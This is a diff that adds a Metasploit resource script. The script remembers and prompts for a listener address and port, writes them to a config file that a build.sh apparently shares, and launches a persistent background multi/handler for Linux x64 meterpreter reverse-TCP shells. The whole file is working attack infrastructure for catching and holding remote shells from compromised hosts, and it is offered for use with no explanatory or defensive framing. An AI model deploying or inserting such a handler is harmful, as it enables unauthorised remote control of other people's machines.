@@ -1,0 +1,28 @@
+<ruby>
+# Remember last-used values so a repeat run is just Enter-Enter.
+# Shares a plain key=value file with build.sh so the two always match.
+state = File.join(Msf::Config.config_directory, "last.conf")
+
+lhost, lport = "192.168.77.2", "4444"
+if File.exist?(state)
+  File.readlines(state).each do |line|
+    k, v = line.strip.split("=", 2)
+    lhost = v if k == "lhost"
+    lport = v if k == "lport"
+  end
+end
+
+# Keep value in brackets unless user overrides.
+new = Readline.readline("LHOST [#{lhost}]: ", true); lhost = new unless new.strip.empty?
+new = Readline.readline("LPORT [#{lport}]: ", true); lport = new unless new.strip.empty?
+
+# Save what was used so build.sh defaults to the same values.
+File.write(state, "lhost=#{lhost}\nlport=#{lport}\n")
+
+run_single("use exploit/multi/handler")
+run_single("set PAYLOAD linux/x64/meterpreter/reverse_tcp")
+run_single("set LHOST #{lhost}")
+run_single("set LPORT #{lport}")
+run_single("set ExitOnSession false")
+run_single("exploit -j")
+</ruby>
